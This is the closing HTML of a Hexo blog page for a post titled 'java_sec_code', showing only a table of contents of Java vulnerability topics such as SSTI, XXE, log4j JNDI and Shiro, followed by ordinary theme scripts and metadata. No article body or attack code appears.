class="toc-text">10.PathTraversal</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-SSTI"><span class="toc-text">11.SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-GetRequestURI"><span class="toc-text">12.GetRequestURI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-SQLI"><span class="toc-text">13.SQLI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-Fastjson"><span class="toc-text">14.Fastjson</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-XXE"><span class="toc-text">15.XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-XSS"><span class="toc-text">16.XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-SpEL"><span class="toc-text">17.SpEL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-XStreamRCE"><span class="toc-text">18.XStreamRCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-log4j"><span class="toc-text">19.log4j</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-JNDI"><span class="toc-text">1.JNDI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-text">2.复现过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-Shiro"><span class="toc-text">20.Shiro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21"><span class="toc-text">21.</span></a></li></ol>
    </div>
  </section>

  

</div>


<!-- 没有 pjax 占位会报错 万恶的 pjax -->

  <div class="pjax">
    <!-- pjax占位 -->
  </div>

  <div class="pjax">
    <!-- pjax占位 -->
  </div>

  <div class="pjax">
    <!-- pjax占位 -->
  </div>

  <div class="pjax">
    <!-- pjax占位 -->
  </div>

  <div class="pjax">
    <!-- pjax占位 -->
  </div>

  <div class="pjax">
    <!-- pjax占位 -->
  </div>

  <div class="pjax">
    <!-- pjax占位 -->
  </div>

  <div class="pjax">
    <!-- pjax占位 -->
  </div>

  <!-- Custom Files side begin -->
  
  <!-- Custom Files side end -->
</aside>



          <!--此文件用来存放一些不方便取值的变量-->
<!--思路大概是将值藏到重加载的区域内-->

<pjax>
<script>
  window.pdata={}
  pdata.ispage=true;
  pdata.commentPath="";
  pdata.commentPlaceholder="";
  pdata.commentConfig={};
  //  see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs
  
    // header
    var l_header=document.getElementById("l_header");
    
    l_header.classList.add("show");
    
    
      // cover
      var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
      var scroll_down=document.getElementById('scroll-down');
      cover_wrapper.id="none";
      cover_wrapper.style.display="none";
      scroll_down.style.display="none";
    
  
</script>
</pjax>
        </div>
        
  
  <footer class="footer clearfix"  itemscope itemtype="http://schema.org/WPFooter">
    <br><br>
    
      
        <div class="aplayer-container">
          


        </div>
      
    
      
        <br>
        <div class="social-wrapper" itemprop="about" itemscope itemtype="http://schema.org/Thing">
          
            
          
            
          
            
          
        </div>
      
    
      
        <div><p>Blog content follows the <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
</div>
      
    
      
        
          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
</div>
        
      
    
      
        Use
        <a href="https://github.com/volantis-x/hexo-theme-volantis/#5.8.0" target="_blank" class="codename">Volantis</a>
        as theme
      
    
      
        <div class='copyright'>
        <p><a href="/">Copyright © since 2017 XXX</a></p>

        </div>
      
    
    <!-- Custom Files footer begin-->
    
    <!-- Custom Files footer end-->
  </footer>


        <a id="s-top" class="fa-solid fa-arrow-up fa-fw" href="/" onclick="return false;" title="top"></a>
      </div>
    </div>
    <div>
      <script>
  /******************** volantis.dom ********************************/
  // 页面选择器 将dom对象缓存起来 see: /source/js/app.js etc.
  volantis.dom.bodyAnchor = volantis.dom.$(document.getElementById("safearea")); // 页面主体
  volantis.dom.topBtn = volantis.dom.$(document.getElementById('s-top')); // 向上
  volantis.dom.wrapper = volantis.dom.$(document.getElementById('wrapper')); // 整个导航栏
  volantis.dom.coverAnchor = volantis.dom.$(document.querySelector('#l_cover .cover-wrapper')); // 1个
  volantis.dom.switcher = volantis.dom.$(document.querySelector('#l_header .switcher .s-search')); // 搜索按钮   移动端 1个
  volantis.dom.header = volantis.dom.$(document.getElementById('l_header')); // 移动端导航栏
  volantis.dom.search = volantis.dom.$(document.querySelector('#l_header .m_search')); // 搜索框 桌面端 移动端 1个
  volantis.dom.mPhoneList = volantis.dom.$(document.querySelectorAll('#l_header .m-phone .list-v')); //  手机端 子菜单 多个
</script>

<script>
  
  volantis.css("https://unpkg.com/volantis-static@0.0.1654736714924/libs/@fortawesome/fontawesome-free/css/all.min.css");
  
  
  
</script>

<!-- required -->


<!-- internal -->

<script src="/js/app.js"></script>






<!-- rightmenu要在darkmode之前（ToggleButton） darkmode要在comments之前（volantis.dark.push）-->



<script>
  function loadIssuesJS() {
    
      const sites_api = document.getElementById('sites-api');
      if (sites_api != undefined && typeof SitesJS === 'undefined') {
        volantis.js("/js/plugins/tags/sites.js")
      }
    
    
      const friends_api = document.getElementById('friends-api');
      if (friends_api != undefined && typeof FriendsJS === 'undefined') {
        volantis.js("/js/plugins/tags/friends.js")
      }
    
    
      const contributors_api = document.getElementById('contributors-api');
      if (contributors_api != undefined && typeof ContributorsJS === 'undefined') {
        volantis.js("/js/plugins/tags/contributors.js")
      }
    
  };
  loadIssuesJS()
  volantis.pjax.push(()=>{
    loadIssuesJS();
  })

</script>




  <script defer src="https://unpkg.com/volantis-static@0.0.1654736714924/libs/vanilla-lazyload/dist/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazyload",
    threshold: 0
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    lazyLoadInstance.update();
  });
  document.addEventListener('pjax:complete', function () {
    lazyLoadInstance.update();
  });
</script>




  

<script>
  window.FPConfig = {
	delay: 0,
	ignoreKeywords: ["#"],
	maxRPS: 6,
	hoverDelay: 0
  };
</script>
<script defer src="https://unpkg.com/volantis-static@0.0.1654736714924/libs/flying-pages/flying-pages.min.js"></script>









      <script>
  volantis.layoutHelper("comments",`<div id="giscus_container"></div>`)

  volantis.giscus = {};

  function check_giscus() {
    if (volantis.dark.mode === "dark") {
      volantis.giscus.Theme = 'dark';
    } else {
      volantis.giscus.Theme = 'light';
    }

    return document.getElementById("giscus_container");
  }

  function pjax_giscus() {
    const HEAD = check_giscus();
    if (!HEAD) return;
    let cfg = Object.assign({"theme":{"light":"light","dark":"dark"}},pdata.commentConfig)
    const script = document.createElement('script');
    script.setAttribute('src', 'https://giscus.app/client.js');
    Object.keys(cfg).forEach(k=>{
      if (k != "theme") {
        script.setAttribute('data-'+k, cfg[k]);
      }
    })
    script.setAttribute('data-theme', volantis.giscus.Theme);
    script.setAttribute('crossorigin', "anonymous");
    HEAD.appendChild(script);
  }

  function dark_giscus() {
    const HEAD = check_giscus();
    if (!HEAD) return;

    const message = {
      setConfig: {
        theme: volantis.giscus.Theme
      }
    };
    const giscusIframe = document.querySelector('iframe.giscus-frame');
    giscusIframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
  }
  pjax_giscus();
  volantis.pjax.push(pjax_giscus);
  volantis.dark.push(dark_giscus);
</script>

    





<!-- optional -->

  <script>
  const SearchServiceDataPathRoot = ("/" || "/").endsWith("/") ?
    "/" || "/" :
    "//" || "/";
  const SearchServiceDataPath = SearchServiceDataPathRoot + "content.json";

  function loadSearchScript() {
    // see: layout/_partial/scripts/_ctrl/cdnCtrl.ejs
    return volantis.js("/js/search/hexo.js");
  }

  function loadSearchService() {
    loadSearchScript();
    document.querySelectorAll(".input.u-search-input").forEach((e) => {
      e.removeEventListener("focus", loadSearchService, false);
    });

    document.querySelectorAll(".u-search-form").forEach((e) => {
      e.addEventListener("submit", (event) => {
        event.preventDefault();
      }, false);
    });
  }

  // 打开并搜索 字符串 s
  function OpenSearch(s) {
    if (typeof SearchService === 'undefined')
      loadSearchScript().then(() => {
        SearchService.setQueryText(s);
        SearchService.search();
      });
    else {
      SearchService.setQueryText(s);
      SearchService.search();
    }
  }

  // 访问含有 ?s=xxx  的链接时打开搜索 // 与搜索引擎 structured data 相关: /scripts/helpers/structured-data/lib/config.js
  if (window.location.search && /^\?s=/g.test(window.location.search)) {
    let queryText = decodeURI(window.location.search)
      .replace(/\ /g, "-")
      .replace(/^\?s=/g, "");
    OpenSearch(queryText);
  }

  // 搜索输入框获取焦点时加载搜索
  document.querySelectorAll(".input.u-search-input").forEach((e) => {
    e.addEventListener("focus", loadSearchService, false);
  });
</script>







  <script>



  function pjax_highlightjs_copyCode(){
    if (!(document.querySelector(".highlight .code pre") ||
      document.querySelector(".article pre code"))) {
      return;
    }
    VolantisApp.utilCopyCode(".highlight .code pre, .article pre code")
  }
  volantis.requestAnimationFrame(pjax_highlightjs_copyCode)
  volantis.pjax.push(pjax_highlightjs_copyCode)

</script>












  <script>
  function load_swiper() {
    if (!document.querySelectorAll(".swiper-container")[0]) return;
    volantis.css("https://unpkg.com/volantis-static@0.0.1654736714924/libs/swiper/swiper-bundle.min.css");
    volantis.js("https://unpkg.com/volantis-static@0.0.1654736714924/libs/swiper/swiper-bundle.min.js").then(() => {
      pjax_swiper();
    });
  }

  load_swiper();

  function pjax_swiper() {
    volantis.swiper = new Swiper('.swiper-container', {
      slidesPerView: 'auto',
      spaceBetween: 8,
      centeredSlides: true,
      loop: true,
      pagination: {
        el: '.swiper-pagination',
        clickable: true,
      },
      navigation: {
        nextEl: '.swiper-button-next',
        prevEl: '.swiper-button-prev',
      },
    });
  }

  volantis.pjax.push(() => {
    if (!document.querySelectorAll(".swiper-container")[0]) return;
    if (typeof volantis.swiper === "undefined") {
      load_swiper();
    } else {
      pjax_swiper();
    }
  });
</script>


<!-- pjax 标签必须存在于所有页面 否则 pjax error -->
<pjax>

</pjax>

<script>
  function listennSidebarTOC() {
    const navItems = document.querySelectorAll(".toc li");
    if (!navItems.length) return;
    let targets = []
    const sections = [...navItems].map((element) => {
      const link = element.querySelector(".toc-link");
      const target = document.getElementById(
        decodeURI(link.getAttribute("href")).replace("#", "")
      );
      targets.push(target)
      // 解除 a 标签 href 的 锚点定位, a 标签 href 的 锚点定位 会随机启用?? 产生错位???
      link.setAttribute("onclick","return false;")
      link.setAttribute("toc-action","toc-"+decodeURI(link.getAttribute("href")).replace("#", ""))
      link.setAttribute("href","/")
      // 配置 点击 触发新的锚点定位
      link.addEventListener("click", (event) => {
        event.preventDefault();
        // 这里的 addTop 是通过错位使得 toc 自动展开.
        volantis.scroll.to(target,{addTop: 5, observer:true})
        // Anchor id
        history.pushState(null, document.title, "#" + target.id);
      });
      return target;
    });

    function activateNavByIndex(target) {
      if (target.classList.contains("active-current")) return;

      document.querySelectorAll(".toc .active").forEach((element) => {
        element.classList.remove("active", "active-current");
      });
      target.classList.add("active", "active-current");
      let parent = target.parentNode;
      while (!parent.matches(".toc")) {
        if (parent.matches("li")) parent.classList.add("active");
        parent = parent.parentNode;
      }
    }

    // 方案一：
    volantis.activateNavIndex=0
    activateNavByIndex(navItems[volantis.activateNavIndex])
    volantis.scroll.push(()=>{
      if (targets[0].getBoundingClientRect().top >= 0) {
        volantis.activateNavIndex = 0
      }else if (targets[targets.length-1].getBoundingClientRect().top < 0) {
        volantis.activateNavIndex = targets.length-1
      } else {
        for (let index = 0; index < targets.length; index++) {
          const target0 = targets[index];
          const target1 = targets[(index+1)%targets.length];
          if (target0.getBoundingClientRect().top < 0&&target1.getBoundingClientRect().top >= 0) {
            volantis.activateNavIndex=index
            break;
          }
        }
      }
      activateNavByIndex(navItems[volantis.activateNavIndex])
    })

    // 方案二：
    // IntersectionObserver 不是完美精确到像素级别 也不是低延时性的
    // function findIndex(entries) {
    //   let index = 0;
    //   let entry = entries[index];
    //   if (entry.boundingClientRect.top > 0) {
    //     index = sections.indexOf(entry.target);
    //     return index === 0 ? 0 : index - 1;
    //   }
    //   for (; index < entries.length; index++) {
    //     if (entries[index].boundingClientRect.top <= 0) {
    //       entry = entries[index];
    //     } else {
    //       return sections.indexOf(entry.target);
    //     }
    //   }
    //   return sections.indexOf(entry.target);
    // }
    // function createIntersectionObserver(marginTop) {
    //   marginTop = Math.floor(marginTop + 10000);
    //   let intersectionObserver = new IntersectionObserver(
    //     (entries, observe) => {
    //       let scrollHeight = document.documentElement.scrollHeight;
    //       if (scrollHeight > marginTop) {
    //         observe.disconnect();
    //         createIntersectionObserver(scrollHeight);
    //         return;
    //       }
    //       let index = findIndex(entries);
    //       activateNavByIndex(navItems[index]);
    //     }, {
    //       rootMargin: marginTop + "px 0px -100% 0px",
    //       threshold: 0,
    //     }
    //   );
    //   sections.forEach((element) => {
    //     element && intersectionObserver.observe(element);
    //   });
    // }
    // createIntersectionObserver(document.documentElement.scrollHeight);
  }

  document.addEventListener("DOMContentLoaded", ()=>{
    volantis.requestAnimationFrame(listennSidebarTOC)
  });
  document.addEventListener("pjax:success", ()=>{
    volantis.requestAnimationFrame(listennSidebarTOC)
  });
</script>



<script>
  document.onreadystatechange = function () {
    if (document.readyState == 'complete') {
      // 页面加载完毕 样式加载失败，或是当前网速慢，或是开启了省流模式
      const { saveData, effectiveType } = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {}
      if (getComputedStyle(document.querySelector("#safearea"), null)["display"] == "none" || saveData || /2g/.test(effectiveType)) {
        document.querySelectorAll(".reveal").forEach(function (e) {
          e.style["opacity"] = "1";
        });
        document.querySelector("#safearea").style["display"] = "block";
      }
    }
  }
</script>


  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/07/22/java-sec-code/","name":"java_sec_code"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"java_sec_code","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/07/22/java-sec-code/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/07/22/java-sec-code/","wordCount":0,"datePublished":"2025-07-22T11:28:08.000Z","dateModified":"2025-08-13T09:10:51.866Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>



      
        <!--
  pjax重载区域接口：
  1.  <pjax></pjax> 标签 pjax 标签必须存在于所有页面 否则 pjax error
  2.  script[data-pjax]
  3.  .pjax-reload script
  4.  .pjax
-->



<script src="https://unpkg.com/volantis-static@0.0.1654736714924/libs/pjax/pjax.min.js"></script>


<script>
    var pjax;
    document.addEventListener('DOMContentLoaded', function () {
      pjax = new Pjax({
        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox]):not([onclick="return false;"]):not([onclick="return!1"]):not([target="_blank"]):not([target="view_window"]):not([href$=".xml"])',
        selectors: [
          "head title",
          "head meta[name=keywords]",
          "head meta[name=description]",
          
          "#l_main",
          "#pjax-header-nav-list",
          ".pjax",
          "pjax", // <pjax></pjax> 标签
          "script[data-pjax], .pjax-reload script" // script标签添加data-pjax 或 script标签外层添加.pjax-reload 的script代码段重载
        ],
        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
        timeout: 5000,
        
      });
    });

    document.addEventListener('pjax:send', function (e) {
      //window.stop(); // 相当于点击了浏览器的停止按钮

      try {
        var currentUrl = window.location.pathname;
        var targetUrl = e.triggerElement.href;
        var banUrl = [""];
        if (banUrl[0] != "") {
          banUrl.forEach(item => {
            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
              window.location.href = targetUrl;
            }
          });
        }
      } catch (error) {}

      // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
      volantis.pjax.method.send.start();
    });

    document.addEventListener('pjax:complete', function () {
      // 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
      volantis.pjax.method.complete.start();
    });

    document.addEventListener('pjax:error', function (e) {
      if(volantis.debug) {
        console.error(e);
        console.log('pjax error: \n' + JSON.stringify(e));
      }else{
        // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
        volantis.pjax.method.error.start();
        window.location.href = e.triggerElement.href;
      }
    });
</script>

      
    </div>
    <!-- import body_end begin-->
    <!-- import body_end end-->
    <!-- Custom Files bodyEnd begin-->
    
    <!-- Custom Files bodyEnd end-->
    <!-- front-matter body_end begin -->
    <!-- front-matter body_end end -->
  </body>
</html>
